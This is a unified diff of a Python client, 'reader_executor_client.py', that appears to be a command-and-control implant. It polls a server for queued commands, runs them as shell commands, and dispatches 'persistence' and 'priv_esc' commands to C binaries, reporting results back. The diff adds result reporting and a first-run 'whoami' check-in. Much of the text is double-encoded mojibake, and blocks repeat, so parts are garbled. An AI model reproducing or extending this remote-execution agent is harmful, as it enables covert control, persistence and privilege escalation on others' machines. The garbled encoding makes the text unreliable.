@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 reader_executor_client.py
-â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 Procedural Python client that:
   1. Reads the LAST record in the DB for a given Machine ID
      (uses READ_LAST verb).
@@ -17,11 +17,11 @@ Example:
     python3 reader_executor_client.py MACHINE-42
 
 Protocol (application layer, text over TCP):
-    READ_LAST request  â†’ READ_LAST|<machine_id>\n
-    READ_LAST response â†’ OK|<json_object>\n   or   ERR|NOT_FOUND\n
+    READ_LAST request  Ã¢â€ â€™ READ_LAST|<machine_id>\n
+    READ_LAST response Ã¢â€ â€™ OK|<json_object>\n   or   ERR|NOT_FOUND\n
 
-    UPDATE_RESULT req  â†’ UPDATE_RESULT|<uuid>|<result>\n
-    UPDATE_RESULT resp â†’ OK|UPDATED\n           or   ERR|...\n
+    UPDATE_RESULT req  Ã¢â€ â€™ UPDATE_RESULT|<uuid>|<result>\n
+    UPDATE_RESULT resp Ã¢â€ â€™ OK|UPDATED\n           or   ERR|...\n
 
 Note on the result field:
     Newlines and pipe characters in the command output are replaced
@@ -35,26 +35,26 @@ import sys
 import json
 import subprocess
 from datetime import date
-import uuid  # only used to show the concept â€“ server generates the real UUID
+import uuid  # only used to show the concept Ã¢â‚¬â€œ server generates the real UUID
 import time
 
 
-# â”€â”€ configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# Ã¢â€â‚¬Ã¢â€â‚¬ configuration Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 9000
 RECV_SIZE   = 4096
 C_BINARY_RUN_SYSTEM_COMMAND  = "../C/run_system_command"
 
-# â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# Ã¢â€â‚¬Ã¢â€â‚¬ helpers Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
-import uuid  # only used to show the concept â€“ server generates the real UUID
+import uuid  # only used to show the concept Ã¢â‚¬â€œ server generates the real UUID
 
-# â”€â”€ configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# Ã¢â€â‚¬Ã¢â€â‚¬ configuration Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 9000
 RECV_SIZE   = 4096
 
-# â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# Ã¢â€â‚¬Ã¢â€â‚¬ helpers Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
 def send_request(host: str, port: int, message: str) -> str:
     """
@@ -78,7 +78,7 @@ def send_request(host: str, port: int, message: str) -> str:
     return response.decode().strip()
 
 
-def write_record(machine_id: str, command: str, result: str) -> None:
+def write_record(machine_id: str, command: str) -> None:
     """
     Send WRITE|machine_id|command to the server, print the result.
     """
@@ -87,8 +87,8 @@ def write_record(machine_id: str, command: str, result: str) -> None:
         print("ERROR: machine_id and command must not contain '|'")
         sys.exit(1)
 
-    request  = f"WRITE|{machine_id}|{command}|{result}"
-    print(f"[writer] Connecting to {SERVER_HOST}:{SERVER_PORT} â€¦")
+    request  = f"WRITE|{machine_id}|{command}"
+    print(f"[writer] Connecting to {SERVER_HOST}:{SERVER_PORT} Ã¢â‚¬Â¦")
     response = send_request(SERVER_HOST, SERVER_PORT, request)
     print(f"[writer] Server response: {response}")
 
@@ -216,7 +216,7 @@ def update_result(record_uuid: str, result: str) -> None:
         sys.exit(1)
 
 
-# â”€â”€ entry point â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# Ã¢â€â‚¬Ã¢â€â‚¬ entry point Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 
 def main():
 	'''
@@ -236,7 +236,7 @@ def main():
 			with open('machine.txt', 'r') as file:
 				machine_id = file.read()
 				print(machine_id)
-				# Step 1 â€“ fetch the latest pending record for this machine
+				# Step 1 Ã¢â‚¬â€œ fetch the latest pending record for this machine
 				record = read_last_record(machine_id)
 				print(f"[executor] Record fetched: {record}")
 
@@ -244,14 +244,14 @@ def main():
 				command     = record.get("command", "")
 
 				if not record_uuid:
-					print("[executor] Record has no UUID â€“ cannot update result.")
+					print("[executor] Record has no UUID Ã¢â‚¬â€œ cannot update result.")
 					sys.exit(1)
 
 				if not command:
-					print("[executor] Record has no command â€“ nothing to execute.")
+					print("[executor] Record has no command Ã¢â‚¬â€œ nothing to execute.")
 					sys.exit(1)
 				if tmp_command != command:
-					# Step 2 â€“ run the command
+					# Step 2 Ã¢â‚¬â€œ run the command
 					#output = execute_command(command)
 					#--------------------------------------------#
 					#  EXTEND THIS IF ELSE IF TO SUPPORT NEW PLUGINS		 #
@@ -272,15 +272,17 @@ def main():
 						    
 						    # Print the output from the C program
 						    print("Output:", result.stdout)
-							update_result(record_uuid, "Persisted on startup")
+						    update_result(record_uuid, "Persisted on startup")
 						
 						except subprocess.CalledProcessError as e:
 						    print(f"Error running binary. Exit code: {e.returncode}")
 						    print("Error output:", e.stderr)
+						    update_result(record_uuid, "Error Persisting on startup")
 						    
 						except FileNotFoundError:
 						    print(f"Binary not found at: {binary_path}")
-					else if command.startswith("priv_esc"):
+						    update_result(record_uuid, "Persistence binary not found")
+					elif command.startswith("priv_esc"):
 
 						# Define relative paths
 						script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -297,14 +299,16 @@ def main():
 						    
 						    # Print the output from the C program
 						    print("Output:", result.stdout)
-							update_result(record_uuid, "Persisted on startup")
+						    update_result(record_uuid, "Priv esc successful")
 						
 						except subprocess.CalledProcessError as e:
 						    print(f"Error running binary. Exit code: {e.returncode}")
 						    print("Error output:", e.stderr)
+						    update_result(record_uuid, "Error Priv esc")
 						    
 						except FileNotFoundError:
 						    print(f"Binary not found at: {binary_path}")
+						    update_result(record_uuid, "Priv Esc bin not found")
 					
 					else:	
 					#	command_value = command.split(":")
@@ -318,10 +322,6 @@ def main():
 										
 						print(f"[executor] System Command output: {output!r}")
 						update_result(record_uuid, output)
-				else:
-					print("Unknown command")
-
-					# Step 3 â€“ push the result back to the DB
 					
 				tmp_command = command
 		else:
@@ -329,7 +329,16 @@ def main():
 			with open("machine.txt", "w") as f:
 				machine_id = execute_command("whoami") + date.today().isoformat()
 				f.write(machine_id)
-				write_record(machine_id, "whoami", execute_command("whoami"))
+				result_running_for_first_time =  execute_command("whoami")
+				print("Running for first time")
+				print("---"+result_running_for_first_time)
+				write_record(machine_id, "whoami")
+				first_record = read_last_record(machine_id)
+				
+				first_record_uuid = first_record.get("uuid", "")
+				command_first     = first_record.get("command", "")
+				
+				update_result(first_record_uuid, result_running_for_first_time)
 				tmp_command = "whoami"
 				
 		print("Wait for 20 seconds...")
